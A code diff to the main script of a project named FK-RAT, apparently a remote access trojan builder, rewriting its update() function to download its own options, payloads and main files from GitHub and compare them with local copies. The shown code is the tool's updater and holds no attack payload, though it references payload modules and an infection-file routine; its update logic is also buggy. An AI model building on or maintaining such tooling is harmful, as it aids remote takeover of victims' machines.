@@ -4,6 +4,7 @@ import readline
 import filecmp
 import json
 import requests
+import urllib.request
 
 from modules import payloads as pay
 
@@ -95,16 +96,29 @@ def prepairInfectionFile():
     
 def update():
     print("[..] Checking for Updates...")
+    update_needed = False
     local_options = f"{local_path}/modules/options.py"
     local_payloads = f"{local_path}/modules/payloads.py"
     local_main = f"{local_path}/main.py"
     
-    github_options = "https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/modules/options.py"
-    github_payload = "https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/modules/payloads.py"
-    github_main = "https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/main.py"
-    filecmp.clear_cache
-    update_needed = filecmp.cmp(local_options, github_options, shallow=True) or filecmp.cmp(local_payloads, github_payload, shallow=True) or filecmp.cmp(local_main, github_main, shallow=True)
-
+    opt = "https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/modules/options.py"
+    pay = "https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/modules/payloads.py"
+    main = "https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/main.py"
+    
+    urllib.request.urlretrieve(opt, f"{local_path}/Downloads/options.py")
+    urllib.request.urlretrieve(pay, f"{local_path}/Downloads/payloads.py")
+    urllib.request.urlretrieve(main, f"{local_path}/Downloads/main.py")
+    
+    github_options = f"{local_path}/Downloads/options.py"
+    github_payload = f"{local_path}/Downloads/payloads.py"
+    github_main = f"{local_path}/Downloads/main.py"
+    
+    update_needed = filecmp.cmp(local_options, github_options, shallow=True)
+    update_needed = filecmp.cmp(local_payloads, github_payload, shallow=True)
+    update_needed = filecmp.cmp(local_main, github_main, shallow=True)
+    
+    
+    os.remove(f"{local_path}/Downloads/*")
     if update_needed:
         choice = input("There is a newer version of this tool avaible, do you want to update it? \n(y or n [n = default])")
         if choice == "y" or "Y":
